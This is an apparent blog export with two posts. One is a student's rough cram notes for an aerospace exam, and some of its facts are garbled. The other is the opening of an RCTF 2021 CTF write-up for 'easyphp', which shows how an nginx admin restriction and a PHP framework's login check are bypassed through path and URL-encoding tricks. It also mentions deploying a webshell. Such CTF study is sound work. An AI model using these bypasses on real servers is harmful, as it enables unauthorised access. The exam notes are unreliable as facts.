    <content><![CDATA[<h2 id="航概期末绝杀"><a href="#航概期末绝杀" class="headerlink" title="航概期末绝杀"></a>航概期末绝杀</h2><p>航概期末绝杀的，前两天刷的第一遍题库毛也没记住，考前13个小时开始重新二刷，连刷带整理，连续肝了12个小时，刷了两千道题。</p>
<p>这是顺手整理的阴间资料，总算是把考试挺过去了。</p>
<span id="more"></span>
<h3 id="直升机"><a href="#直升机" class="headerlink" title="直升机"></a>直升机</h3><p>直9 阿帕奇</p>
<h3 id="一代超声速"><a href="#一代超声速" class="headerlink" title="一代超声速"></a>一代超声速</h3><p>F100，米格19</p>
<h3 id="二代超声速"><a href="#二代超声速" class="headerlink" title="二代超声速"></a>二代超声速</h3><p>米格21，F104</p>
<h3 id="超三倍声速"><a href="#超三倍声速" class="headerlink" title="超三倍声速"></a>超三倍声速</h3><p>米格25，SR71，XB37</p>
<h3 id="三代战斗机"><a href="#三代战斗机" class="headerlink" title="三代战斗机"></a>三代战斗机</h3><p>F15，Su27，米格29</p>
<h3 id="四代战斗机"><a href="#四代战斗机" class="headerlink" title="四代战斗机"></a>四代战斗机</h3><p>F35，歼31，歼20，F22</p>
<h3 id="我国的三代战斗机"><a href="#我国的三代战斗机" class="headerlink" title="我国的三代战斗机"></a>我国的三代战斗机</h3><p>歼10，11，16</p>
<h3 id="隐形机"><a href="#隐形机" class="headerlink" title="隐形机"></a>隐形机</h3><p>F117，F22，b2</p>
<h3 id="二三代隐形机"><a href="#二三代隐形机" class="headerlink" title="二三代隐形机"></a>二三代隐形机</h3><p>没有F117</p>
<h3 id="隐形直升机"><a href="#隐形直升机" class="headerlink" title="隐形直升机"></a>隐形直升机</h3><p>科曼奇</p>
<p>F80 喷气机</p>
<h3 id="二战飞机"><a href="#二战飞机" class="headerlink" title="二战飞机"></a>二战飞机</h3><p>没有米格9</p>
<h3 id="直升机-1"><a href="#直升机-1" class="headerlink" title="直升机"></a>直升机</h3><ul>
<li>升力周期改变：变距</li>
<li>总距：安装角增大增小</li>
<li><p>尾桨的推力：脚</p>
</li>
<li><p>拉力靠桨距</p>
</li>
<li>自动倾斜器带角度：不能同时增大桨距</li>
<li>自动倾斜器上下： 上下+同时</li>
</ul>
<p>第一架航天飞机：哥伦比亚</p>
<h3 id="导弹"><a href="#导弹" class="headerlink" title="导弹"></a>导弹</h3><p>有翼导弹：高机动，巡航</p>
<p>战术弹道：1000km</p>
<p>弹道导弹控制方式：没有翼面</p>
<p>现代巡航导弹：起飞质量小，不同的目标</p>
<h2 id="飞行原理"><a href="#飞行原理" class="headerlink" title="飞行原理"></a>飞行原理</h2><p>无人机</p>
<p>2加速，2减速 偏航</p>
<h3 id="声爆：无推力"><a href="#声爆：无推力" class="headerlink" title="声爆：无推力"></a>声爆：无推力</h3><p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210625232951217.png" alt="image-20210625232951217"></p>
<h3 id="减小波阻"><a href="#减小波阻" class="headerlink" title="减小波阻"></a>减小波阻</h3><p>三角机翼</p>
<h3 id="大气层"><a href="#大气层" class="headerlink" title="大气层"></a>大气层</h3><p>对流层：下降，水平流动</p>
<p>平流层：先不变再升高</p>
<p>中间层：下降</p>
<p>热层：温度升高</p>
<h3 id="阻力"><a href="#阻力" class="headerlink" title="阻力"></a>阻力</h3><ul>
<li>干扰阻力:整流片</li>
<li>粘性摩擦阻力：无飞行形状</li>
<li>粘性压差阻力：流线型  ，飞行器形状，最大迎风面积</li>
<li>诱导阻力：升力产生的，和相对位置无关：  减少方式：翼梢小翼和大展弦比</li>
<li>激波阻力：高速才有，机翼尖锐</li>
</ul>
<p>激波：波面后气流密度变大，速度降低，压强变大，跟温度没关系</p>
<p>民用飞机：后掠机翼 延缓激波</p>
<p>气流的速度减小</p>
<p>翼尖时速：加装翼刀、锯齿缺口。</p>
<h2 id="外形"><a href="#外形" class="headerlink" title="外形"></a>外形</h2><h3 id="鸭子："><a href="#鸭子：" class="headerlink" title="鸭子："></a>鸭子：</h3><p>不稳</p>
<h3 id="自旋稳定："><a href="#自旋稳定：" class="headerlink" title="自旋稳定："></a>自旋稳定：</h3><h3 id="前掠翼"><a href="#前掠翼" class="headerlink" title="前掠翼"></a>前掠翼</h3><p>X29 C37</p>
<p>失速机动性能好</p>
<p>起飞着陆性能好</p>
<h3 id="变后掠翼"><a href="#变后掠翼" class="headerlink" title="变后掠翼"></a>变后掠翼</h3><p>米格23，狂风，F14,B1，全选</p>
<p>阻力小</p>
<p>目的：</p>
<ul>
<li>改善低速和告诉性能</li>
<li>提高临街马赫数</li>
</ul>
<h3 id="三角翼"><a href="#三角翼" class="headerlink" title="三角翼"></a>三角翼</h3><p>没有升力大</p>
<h3 id="小展弦比飞机"><a href="#小展弦比飞机" class="headerlink" title="小展弦比飞机"></a>小展弦比飞机</h3><p>优点：激波阻力小，机动性能好</p>
<h3 id="超临界翼型"><a href="#超临界翼型" class="headerlink" title="超临界翼型"></a>超临界翼型</h3><p>圆的</p>
<h4 id="歼20"><a href="#歼20" class="headerlink" title="歼20"></a>歼20</h4><p>鸭翼布局，双发</p>
<h3 id="歼31"><a href="#歼31" class="headerlink" title="歼31"></a>歼31</h3><p>单座，双发</p>
<h3 id="大部分直升机"><a href="#大部分直升机" class="headerlink" title="大部分直升机"></a>大部分直升机</h3><p>轮式起落架</p>
<h3 id="轻型直升机"><a href="#轻型直升机" class="headerlink" title="轻型直升机"></a>轻型直升机</h3><p>滑橇式起落架</p>
<p>推力矢量 和超声速无关，没有摆动发动机</p>
<h3 id="飞艇"><a href="#飞艇" class="headerlink" title="飞艇"></a>飞艇</h3><p>靠发动力提供动力</p>
<p>静升力60 70，提供：升力面 充入氦气的气囊</p>
<p>速度 30 - 40</p>
<p>升降：加热程度</p>
<p>升降舵：操纵灵魂，多用于小型飞艇</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626041806765.png" alt="image-20210626041806765"></p>
<p>副气囊：有操纵选操纵，可以调节副气囊大小</p>
<p>和气球的区别：吊舱和气囊的链接不同，方向控制不同</p>
<h3 id="气球"><a href="#气球" class="headerlink" title="气球"></a>气球</h3><p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626041748215.png" alt="image-20210626041748215"></p>
<p>氢气球：   抛物放气  升降，不能进行方向控制</p>
<p>热气球：  加热 放气  升降</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626043743316.png" alt="image-20210626043743316"></p>
<h2 id="发动机"><a href="#发动机" class="headerlink" title="发动机"></a>发动机</h2><p>空气喷气发动机和火箭发动机 喷气发动机</p>
<h3 id="傻逼形态"><a href="#傻逼形态" class="headerlink" title="傻逼形态"></a>傻逼形态</h3><p>轴流式 压气机转子叶片 扩散形，改变气流方向</p>
<p>亚声速飞行 尾喷管 收缩性</p>
<p>亚声速飞行 进气管 扩散性</p>
<p>涡轮喷气发动机 导向器叶片 收缩性</p>
<p>火箭发动机的喷管 收缩-扩散</p>
<p>拉瓦尔喷管尾喷管</p>
<h3 id="傻逼状态"><a href="#傻逼状态" class="headerlink" title="傻逼状态"></a>傻逼状态</h3><p>起飞状态：涡轮喷气发动机 推力最大</p>
<p>涡轮喷气发动机：起飞状态和慢车状态</p>
<p>慢车状态是起飞状态的4%</p>
<p>巡航状态是起飞推力的 65-75</p>
<p>巡航最省油</p>
<h3 id="燃烧室"><a href="#燃烧室" class="headerlink" title="燃烧室"></a>燃烧室</h3><p>分成两股：冷却火焰筒</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626013933994.png" alt="image-20210626013933994"></p>
<h3 id="涡轮螺桨发动机"><a href="#涡轮螺桨发动机" class="headerlink" title="涡轮螺桨发动机"></a>涡轮螺桨发动机</h3><p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626010248379.png" alt="image-20210626010248379"></p>
<p>噪声太大，不太适合在客机</p>
<h3 id="涡轮喷气"><a href="#涡轮喷气" class="headerlink" title="涡轮喷气"></a>涡轮喷气</h3><p><strong>对空气增压：</strong> 进气管，压气机</p>
<p>耗油率搞，推力大，</p>
<p>噪音大</p>
<p>航空煤油</p>
<p>声障</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626005747087.png" alt="image-20210626005747087"></p>
<h3 id="固体火箭发动机"><a href="#固体火箭发动机" class="headerlink" title="固体火箭发动机"></a>固体火箭发动机</h3><p>排出燃气，反向喷气</p>
<p>用于导弹，填空火箭，助推器</p>
<p>比液体燃烧室温度低</p>
<p>比冲比液体菜</p>
<p>没有控制活门</p>
<p>药柱包覆层：<strong>阻止燃烧</strong>，控制推力大小</p>
<h3 id="涡轮轴发动机"><a href="#涡轮轴发动机" class="headerlink" title="涡轮轴发动机"></a>涡轮轴发动机</h3><p>直升机</p>
<h3 id="涡轮风扇发动机"><a href="#涡轮风扇发动机" class="headerlink" title="涡轮风扇发动机"></a>涡轮风扇发动机</h3><p>风扇由低压涡轮带动</p>
<p>排气速度不大</p>
<h3 id="涡轮江山发动机"><a href="#涡轮江山发动机" class="headerlink" title="涡轮江山发动机"></a>涡轮江山发动机</h3><p>静子叶片，对气流不增速</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626004821037.png" alt="image-20210626004821037"></p>
<h3 id="离心式压气机"><a href="#离心式压气机" class="headerlink" title="离心式压气机"></a>离心式压气机</h3><p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626010445547.png" alt="image-20210626010445547"></p>
<h3 id="串联火箭"><a href="#串联火箭" class="headerlink" title="串联火箭"></a>串联火箭</h3><h3 id="并联火箭"><a href="#并联火箭" class="headerlink" title="并联火箭"></a>并联火箭</h3><p>飞行阻力大，干扰大，链接复杂</p>
<h3 id="固液混合发动机"><a href="#固液混合发动机" class="headerlink" title="固液混合发动机"></a>固液混合发动机</h3><p>还得燃料传输系统</p>
<h3 id="离心式压气机-1"><a href="#离心式压气机-1" class="headerlink" title="离心式压气机"></a>离心式压气机</h3><p>小于10</p>
<h3 id="涡轮燃气发动机"><a href="#涡轮燃气发动机" class="headerlink" title="涡轮燃气发动机"></a>涡轮燃气发动机</h3><p>最广泛的航空</p>
<h3 id="液氢"><a href="#液氢" class="headerlink" title="液氢"></a>液氢</h3><p>沸点低，易燃易爆，不易储存</p>
<h3 id="常用发动机"><a href="#常用发动机" class="headerlink" title="常用发动机"></a>常用发动机</h3><p>战术导弹 固体火箭</p>
<p>高超声速 火箭发动机 冲压发动机</p>
<p>巡航导弹 空气喷气</p>
<h2 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h2><h3 id="高度"><a href="#高度" class="headerlink" title="高度"></a>高度</h3><p>相对高度：机场</p>
<p>绝对高度：海平面</p>
<p>真实高度：地面，无线电</p>
<h3 id="匹配"><a href="#匹配" class="headerlink" title="匹配"></a>匹配</h3><p>地形匹配导航 地形高度轮廓 丘陵 一维匹配导航</p>
<p>景象匹配 地表特征</p>
<p>全面信标系统VOR 侧向无线电导航</p>
<h3 id="惯性导航-陀螺"><a href="#惯性导航-陀螺" class="headerlink" title="惯性导航 陀螺"></a>惯性导航 陀螺</h3><p>陀螺地平仪 没有磁罗盘</p>
<p>平台式惯导：机电陀螺平台</p>
<p>捷联式惯导：数字平台</p>
<p>俯仰</p>
<h3 id="自动控制"><a href="#自动控制" class="headerlink" title="自动控制"></a>自动控制</h3><p>气动舵面 油门杆</p>
<p>综合放大装置 大脑</p>
<p>敏感元件 眼睛</p>
<p>发动机 心脏</p>
<p>仪表着陆 微博着陆</p>
<h3 id="导航-1"><a href="#导航-1" class="headerlink" title="导航"></a>导航</h3><p>机场 位置 高度</p>
<p>侧向无线电导航 测距无线电导航 测距差无线电导航</p>
<h3 id="温度控制系统"><a href="#温度控制系统" class="headerlink" title="温度控制系统"></a>温度控制系统</h3><p>航天器在太空中，无对流</p>
<h3 id="主飞行显示器"><a href="#主飞行显示器" class="headerlink" title="主飞行显示器"></a>主飞行显示器</h3><p>航向角 俯仰角</p>
<p>无人机数据链路 视频接收器 终端处理器</p>
<p>GPS  先监控站  运算处理：主控站</p>
<p>1234 总(大静)仪开</p>
<h2 id="飞机结构"><a href="#飞机结构" class="headerlink" title="飞机结构"></a>飞机结构</h2><p>飞行器结构：受力部件，支撑构件</p>
<p>机身和机翼都不选复合</p>
<h3 id="机身"><a href="#机身" class="headerlink" title="机身"></a>机身</h3><h3 id="机翼"><a href="#机翼" class="headerlink" title="机翼"></a>机翼</h3><p>夹层壁板内部：（要轻），蜂窝夹层，泡沫塑料</p>
<p>薄壁构造机翼  蒙皮骨架式</p>
<p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626040917542.png" alt="image-20210626040917542"></p>
<h3 id="前三点"><a href="#前三点" class="headerlink" title="前三点"></a>前三点</h3><p>优点不选前轮</p>
<p>缺点选前轮</p>
<p>后期</p>
<h3 id="后三点"><a href="#后三点" class="headerlink" title="后三点"></a>后三点</h3><p>缺点不选尾轮 早起</p>
<p>优点：迎角打，安装尾轮</p>
<h3 id="自行车"><a href="#自行车" class="headerlink" title="自行车"></a>自行车</h3><p>全是前轮</p>
<h3 id="车轮"><a href="#车轮" class="headerlink" title="车轮"></a>车轮</h3><p><img src="/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/assets/image-20210626041001003.png" alt="image-20210626041001003"></p>
<h3 id="卫星"><a href="#卫星" class="headerlink" title="卫星"></a>卫星</h3><p>壳体不用合金钢</p>
<p>天线：全有</p>
<p>太阳能：可以可以，结构不必</p>
<h3 id="导弹-1"><a href="#导弹-1" class="headerlink" title="导弹"></a>导弹</h3><p>平面 巡航</p>
<p>10和X： 高机动</p>
<h3 id="材料"><a href="#材料" class="headerlink" title="材料"></a>材料</h3><p>航空航天领域的材料：没有黑色金属</p>
<p>机翼的整体翼梁  Al合金 合金钢</p>
<p>Mg最轻，密度小，比强度和比刚度高，机械加工性能优良</p>
<p>Al合金 比强度比刚度好，价格低廉</p>
<p>钛合金：比强度搞，耐热性好</p>
<h3 id="着陆"><a href="#着陆" class="headerlink" title="着陆"></a>着陆</h3><h4 id="软着陆"><a href="#软着陆" class="headerlink" title="软着陆"></a>软着陆</h4><p>空间探测器： 没有阻力伞 （真空）</p>
<h3 id="航天飞机"><a href="#航天飞机" class="headerlink" title="航天飞机"></a>航天飞机</h3><p>可重复利用：助推火箭 轨道器</p>
<p>飞机的助推火箭不能回收利用</p>
<p>载人飞船的控制中心：成员返回舱</p>
<h2 id="杂七杂八"><a href="#杂七杂八" class="headerlink" title="杂七杂八"></a>杂七杂八</h2><p>现代飞机：kelly</p>
<p>2009年预警机 KJ2000</p>
<h2 id="年份"><a href="#年份" class="headerlink" title="年份"></a>年份</h2><p>1883 活塞式</p>
<p>1903 莱特兄弟 用于航空的活塞</p>
<p>1937 涡轮喷气</p>
<p>1947 X1 美国 声障</p>
<p>1957 苏联卫星</p>
<p>1968 前苏联 超声速</p>
<p>1969 和谐号 超声速</p>
<p>1981 美国航天飞机试飞</p>
<p>1986 挑战者</p>
<p>1994 GPS建设完成</p>
<p>1998 国际空间站</p>
<p>1999 神舟一号</p>
<p>2003 哥伦比亚，神舟五号</p>
<p>2007 嫦娥1号</p>
<p>2007.2 大飞机</p>
<p>2008 天链 8个 36000km</p>
<p>2008 神舟七号</p>
<p>2010 T-50</p>
<p>2011 天宫一号和神舟八号对接</p>
<p>2017 C919</p>
<p>2017天舟一号 太空加油</p>
<h3 id="长征系列"><a href="#长征系列" class="headerlink" title="长征系列"></a>长征系列</h3><p>长征一号：近地轨道小型</p>
<p>长征2号  500Km  F载人</p>
<p>三号：高轨道，3甲 嫦娥</p>
<p>四号：太阳同步轨道</p>
<h3 id="我国："><a href="#我国：" class="headerlink" title="我国："></a>我国：</h3><p>费俊龙和聂海胜一组</p>
<p>翟志刚 太空行走第一人</p>
<p>天宫2号： 太空实验室</p>
<p>气象卫星：风云</p>
<h3 id="神州"><a href="#神州" class="headerlink" title="神州"></a>神州</h3><p>半弹道</p>
<p>神舟三号：假人</p>
<p>神舟四号：有害气体</p>
<p>嫦娥三号：星标软着陆</p>
<p>通信卫星：东方红</p>
<p>北京2号 火箭</p>
<h2 id="恶心的数字"><a href="#恶心的数字" class="headerlink" title="恶心的数字"></a>恶心的数字</h2><p>16个国家空间站</p>
<p>航天器回收的再入段： 80~100</p>
<p>活塞速度816</p>
<p>涡轮罗江发动机 500 700</p>
<p>比冲 5000</p>
<p>推重比 10</p>
<p>远望 7艘</p>
<p>俄罗斯卫星：3个平面</p>
<p>GPS：24个卫星 6个平面，4颗确定一个飞行器，周期12个小时，轨道高度20000km</p>
<p>战斗机 正过载 8~9</p>
<p>北斗 20多颗</p>
<p>地基系统 覆盖率 2~3</p>
<p>20世纪70年代，出现电子屏</p>
<p>气象 三类</p>
<p>空中和海中的121.500HZ</p>
<p>卫星测控系统的测控作用距离为100000km以下</p>
<p>中继卫星对中低轨道 40~50%</p>
<p>美国航天飞机 10人</p>
<p>和平号 5个舱室</p>
<p>美国轨道器飞行 30天</p>
<p>波音737 2台发动机</p>
<p>安225 32个轮胎</p>
<p>鹞式战斗机 6个喷口</p>
]]></content>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>rctf2021.md</title>
    <url>/2021/09/13/rctf2021/</url>
    <content><![CDATA[<h1 id="rctf2021"><a href="#rctf2021" class="headerlink" title="rctf2021"></a>rctf2021</h1><h2 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h2><p>基本是躺的比赛，白天对着php源码看了半天也没看出来漏洞，然后去看密码，只要能分解出一个512bit的数就能出了，可惜分不得。再看去misc，图片那个题误以为p,q,m很大，考虑一堆不同的像素点列几万个方程z3去解，上传上去wget下来发现图片有压缩觉得不可做于是立刻放弃。ezshell那个网上抄了个冰蝎马的代码，编译出.class丢给队友，服务器直接500了，后来发现是jdk版本太高，就交给队友去下载新版本了。回了趟宿舍睡了个觉，早上一醒发现队友们已经把miscAK了，同时又把一个web一个pwn干出来了，最后排名是21，虽然是20名交writeup，但也真的太牛了。。很难过的反思自己为什么这么废物了一上午后决定好好去复盘一下这场比赛。</p>
<span id="more"></span>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>拿到源码先审，很显然是要admin登进去，用户名是admin，但是密码我们无法获取。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$request</span>-&gt;data-&gt;username === <span class="variable">$username</span> &amp;&amp; <span class="variable">$request</span>-&gt;data-&gt;password === <span class="variable">$password</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$app</span>-&gt;redirect(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>此处表明我们需要有user的session才能去登入admin，另外在此处也发现了一点东西：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$app</span>-&gt;route(<span class="string">&#x27;/*&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$app</span>;</span><br><span class="line">    <span class="variable">$request</span> = <span class="variable">$app</span>-&gt;request();</span><br><span class="line">    <span class="variable">$app</span>-&gt;render(<span class="string">&quot;head&quot;</span>,[],<span class="string">&quot;head_content&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$request</span>-&gt;url,<span class="string">&quot;login&quot;</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>])&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$app</span>-&gt;redirect(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这个<code>return true</code>表示的意思就是可以继续这个路由的访问，可以看到，要么有<code>_session[user]</code>,要么url里包含<code>login</code>，就可以直接进到我们想去的路由中。</p>
<p>在web层面我们直接尝试访问<code>/admin</code>，却发现在服务器层被nginx403弹回来了，回去看<code>nginx.conf</code>，里面有很奇怪的点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root   /var/www/html;</span><br><span class="line">location /admin &#123;</span><br><span class="line">    allow 127.0.0.1;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br><span class="line">location / &#123;</span><br><span class="line">    index  index.php;</span><br><span class="line">    try_files $uri @phpfpm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只有本地才能访问/admin???那框架上在写什么东西？？</p>
<p>第一步很明确，我们要绕过nginx对<code>/admin</code>这个路由的解析，这个绕法我在当时无聊的时候发现的一个特性，就是在之前无论输入什么，比如<code>/views/index.php</code>,<code>/views/template.php</code>，结果浏览器跳转的居然是<code>/views/login</code>,这就十分灵性，理论上应该跳回<code>/login</code>的，为了解决这个问题，我们去审这个Flight框架的路由。</p>
<p>重点看<code>/flight/net</code>部分的几个php文件，分别是解析request包，response包和route的，很灵性的就是我们之前在<code>index.php</code>看到的<code>$request-&gt;url</code>。这个<code>url</code>是怎么得到的？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;url&#x27;</span> =&gt; str_replace(<span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;%40&#x27;</span>, <span class="built_in">self</span>::getVar(<span class="string">&#x27;REQUEST_URI&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)),</span><br><span class="line">                <span class="string">&#x27;base&#x27;</span> =&gt; str_replace(<span class="keyword">array</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27; &#x27;</span>), <span class="keyword">array</span>(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;%20&#x27;</span>), dirname(<span class="built_in">self</span>::getVar(<span class="string">&#x27;SCRIPT_NAME&#x27;</span>))),</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;base != <span class="string">&#x27;/&#x27;</span> &amp;&amp; strlen(<span class="keyword">$this</span>-&gt;base) &gt; <span class="number">0</span> &amp;&amp; strpos(<span class="keyword">$this</span>-&gt;url, <span class="keyword">$this</span>-&gt;base) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;url = substr(<span class="keyword">$this</span>-&gt;url, strlen(<span class="keyword">$this</span>-&gt;base));</span><br><span class="line">        &#125;    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>REQUEST_URI</code>是从nginx转发过来的,是原生请求URI</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location @phpfpm &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">    fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">    fastcgi_pass   php:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root/index.php;</span><br><span class="line">    fastcgi_param  REQUEST_URI  $uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以测试一下REQUEST_URI和SCRIPT_NAME都是什麽。</p>
<p><img src="/2021/09/13/rctf2021/assets/image-20210914001902249.png" alt="image-20210914001902249"></p>
<p><img src="/2021/09/13/rctf2021/assets/image-20210914001923674.png" alt="image-20210914001923674"></p>
<p>结合上述代码我们就知道了，<code>$this-&gt;url</code>会拿到之前的<code>base</code>,把<code>/</code>全部拿掉，只剩下最后一部分，才是真正的<code>request-&gt;url</code>，在<code>index.php</code>匹配里全都是这个部分，这就能解决之前说的为什么<code>views/index.php</code>会跳回<code>views/login</code>的问题。</p>
<p>所以要想绕过nginx层仅有本地访问的限制，我们只需要修改为<code>/1/admin</code>，就能绕过nginx，而框架会把我们的url解析成<code>/admin</code>，算是绕过了第一部分。</p>
<p>第二部分是这段代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(stristr(<span class="variable">$request</span>-&gt;url,<span class="string">&quot;login&quot;</span>)!==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要在url里有login就能成功进入/admin了,放在哪里合适呢？思来想去只有放在?充当一个变量才合适。</p>
<p>在这里我们引入nginx里对$uri的理解：<a href="https://www.jianshu.com/p/b9705efc2792">https://www.jianshu.com/p/b9705efc2792</a></p>
<ul>
<li>进行一次url解码</li>
<li><p>去除所有查询字符串，即?及其后面的部分</p>
</li>
<li><p>将连续重复的/替换为单个/</p>
</li>
</ul>
<p>可以测试一下：</p>
<p><img src="/2021/09/13/rctf2021/assets/image-20210914004841582.png" alt="image-20210914004841582"></p>
<p>nginx直接把?后面的东西给抹除了。</p>
<p>但是如果我们把<code>？</code>url编码一下，再放上去，nginx解码之后不会理解<code>?</code>是一个标识符，而是把他理解为一个普通的路由，至此，我们传给php-fpm的url就已经是<code>admin?login</code>,这个就是<code>request-&gt;url</code>，的确包含了<code>login</code>,所以理所应当的我们进入了admin这个身份，并且能看文件了！</p>
<p><img src="/2021/09/13/rctf2021/assets/image-20210914005001611.png" alt="image-20210914005001611"><br>快速过一遍/admin的代码，发现是读当前目录下的文件，通过scandir实现的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;h3&gt;File <span class="keyword">List</span>:&lt;/h3&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">bg</span>-<span class="title">light</span> <span class="title">border</span> <span class="title">rounded</span>-3&quot; <span class="title">style</span>=&quot;<span class="title">white</span>-<span class="title">space</span>: <span class="title">pre</span>-<span class="title">line</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        $<span class="title">dir</span> = <span class="title">pathinfo</span>($<span class="title">data</span>?$<span class="title">data</span>:&quot;.&quot;,<span class="title">PATHINFO_DIRNAME</span>);</span></span><br><span class="line"><span class="class">        <span class="title">foreach</span>(<span class="title">scandir</span>($<span class="title">dir</span>) <span class="title">as</span> $<span class="title">v</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=\&quot;/admin?data=<span class="subst">$dir</span>/<span class="subst">$v</span>\&quot;&gt;<span class="subst">$v</span>&lt;/a&gt;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="variable">$data</span>) &#123; <span class="meta">?&gt;</span>&lt;h3&gt;<span class="meta">&lt;?=</span> <span class="variable">$data</span> . <span class="string">&quot;:&quot;</span> <span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">bg</span>-<span class="title">light</span> <span class="title">border</span> <span class="title">rounded</span>-3&quot;&gt;&lt;<span class="title">code</span> <span class="title">style</span>=&quot;<span class="title">white</span>-<span class="title">space</span>: <span class="title">pre</span>-<span class="title">line</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">file_get_contents</span>($<span class="title">data</span>); ?&gt;&lt;/<span class="title">code</span>&gt;&lt;/<span class="title">div</span>&gt;&lt;?<span class="title">php</span> &#125; ?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们读flag肯定要路径穿越回去，十分不幸的是，在<code>index.php</code>中，把路径穿越符全部禁掉了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isdanger</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array(<span class="variable">$v</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$v</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(isdanger(<span class="variable">$k</span>)||isdanger(<span class="variable">$value</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$v</span>,<span class="string">&quot;../&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
